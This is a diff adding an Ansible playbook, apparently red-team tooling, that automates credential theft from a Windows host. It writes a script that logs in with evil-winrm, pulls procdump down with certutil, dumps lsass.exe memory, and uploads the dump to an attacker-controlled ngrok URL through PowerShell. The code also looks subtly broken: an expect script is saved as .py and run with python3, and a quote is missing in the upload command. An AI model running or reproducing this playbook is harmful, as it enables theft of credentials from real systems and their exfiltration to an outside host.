@@ -1,1 +1,42 @@
+---
+- name: Read ngrok URL from JSON file
+  slurp:
+    src: ngrok_url.json
+  register: ngrok_url_file
+
+- name: Set ngrok URL as a fact
+  set_fact:
+    ngrok_url: "{{ (ngrok_url_file.content | b64decode | from_json).ngrok_url }}"
+      
+
+- name: Create evil-winrm script
+  copy:
+    dest: /opt/mimikatz_dump.py
+    content: |
+    
+          spawn evil-winrm -i {{ target_ip }} -u {{ username }} -p {{ password }}
+          expect "PS C:\\Users\\Administrator\\Documents> "
+          send "certutil -urlcache -split -f {{ procdump_url }} {{ procdump_dest }}\r"
+          expect "PS C:\\Users\\Administrator\\Documents> "
+          send "{{ procdump_dest }} -accepteula -ma lsass.exe {{ lsass_dump_dest }}\r"
+          expect "PS C:\\Users\\Administrator\\Documents> "
+          send "powershell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $FilePath = '{{ lsass_dump_dest }}'; $Uri = '{{ ngrok_url }}/upload; $webClient = New-Object System.Net.WebClient; $webClient.UploadFile($Uri, 'POST', $FilePath)\"\r"
+          expect "PS C:\\Users\\Administrator\\Documents> "
+          send "exit\r"
+          interact
+
+
+- name: Make thescript executable
+  file:
+    path: /opt/mimikatz_dump.py
+    mode: '0755'
+
+- name: Run the mimikatz_dump
+  shell: python3 /opt/mimikatz_dump.py
+  register: mimikatz_dump_output
+
+
+- name: Display the output
+  debug:
+    msg: "{{ mimikatz_dump_output }}"
 
